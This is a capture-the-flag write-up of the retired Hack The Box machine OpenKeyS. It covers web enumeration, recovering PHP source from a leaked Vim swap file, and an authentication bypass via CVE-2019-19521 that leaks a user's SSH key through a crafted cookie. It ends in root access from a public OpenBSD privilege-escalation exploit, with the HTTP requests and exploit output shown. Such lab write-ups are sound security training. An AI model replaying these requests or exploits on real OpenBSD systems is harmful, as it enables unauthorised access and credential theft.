# OpenKeyS

This is the write-up for the box OpenKeyS that got retired at the 12th December 2020.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.199    openkeys.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/openkeys.nmap 10.10.10.199
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html)
```

## Checking HTTP (Port 80)

The web page forwards to a login page on _index.php_ and the title is _"OpenKeyS - Retrieve your OpenSSH Keys"_.
Lets search for hidden directories and PHP files with **Gobuster**:
```
gobuster -u http://10.10.10.199 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

It finds the directory _/includes_ that is an index with two files:
- auth.php
- auth.php.swp

The file _auth.php_ forwards to a blank page, but _auth.php.swp_ is a **Vim swap file**:
```
wget http://10.10.10.199/includes/auth.php.swp
```
```
file auth.php.swp

auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
```

Recovering the PHP source code of the file with **Vim**:
```
vim

:recover auth.php.swp
```

On line five is a potential command injection vulnerability because it is executing _/auth_helpers/check_auth_ with the _escapeshellcmd_ command:
```
function authenticate($username, $password)
{                                                                                                  
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password
(...)
```

There is another potential vulnerability as the _username_ parameter gets called with _REQUEST_ which means that it can be provided in a **GET request**, **POST request** and in a **Cookie**:
```
$_SESSION["username"] = $_REQUEST['username'];
```

When browsing to _/auth_helpers/check_auth_ the file can be downloaded and it is an **ELF binary**:
```
file check_auth

check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

By using `strings` on the binary, it shows _"auth_userokay"_ and when researching this, it becomes clear that this binary uses the [authentication function from OpenBSD](https://man.openbsd.org/authenticate.3).

This function has [Authentication Bypass and Local Privilege Escalation vulnerabilities](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/) from 2019.

### Exploiting Authentication Bypass Vulnerability

The Privilege Escalation vulnerabilities may help us later, when having a user session on the box.

The Authentication Bypass vulnerability _(CVE-2019-19521)_ works by using _"-schallenge"_ on an authentication service to bypass the authentication.
As it does not work on SSH, lets try it on the web page:
```
POST /index.php HTTP/1.1
Host: 10.10.10.199
(...)
username=-schallenge&password=1234
```

It works and forwards to _/sshkey.php_ that says:
```
OpenSSH key not found for user -schallenge
```

By using the other vulnerability in the PHP file _auth.php_ and provide the _username_ parameter in the Cookies, it may show the provided user:
```
POST /index.php HTTP/1.1
(...)
Cookie: PHPSESSID=r4f0do15tih3c07b19dq8j0ju3;username=test
(...)
username=-schallenge&password=1234
```
```
OpenSSH key not found for user test
```

It works and requests the parameter from the cookies and now a valid user is needed.
The _auth.php.swp_ file shows that it belongs to the user _jennifer_ so lets try that username:

```
POST /index.php HTTP/1.1
(...)
Cookie: PHPSESSID=r4f0do15tih3c07b19dq8j0ju3;username=jennifer
(...)
username=-schallenge&password=1234
```
```
OpenSSH key for user jennifer

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
(...)
```

The SSH key for _jennifer_ can be retrieved and used to login into the box:
```
ssh -i jennifer.key jennifer@10.10.10.199
```

## Privilege Escalation

Now one of the Local Privilege Escalation vulnerabilities from the article can be exploited.
A [Proof-of-Concept](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot) for _CVE-2019-19520_ and _CVE-2019-19522_ exists and can be used:
```
openkeys$ ./openbsd-authroot

openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
```

The password that is displayed has to be pasted and it starts a shell as root:
```
openkeys# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
```
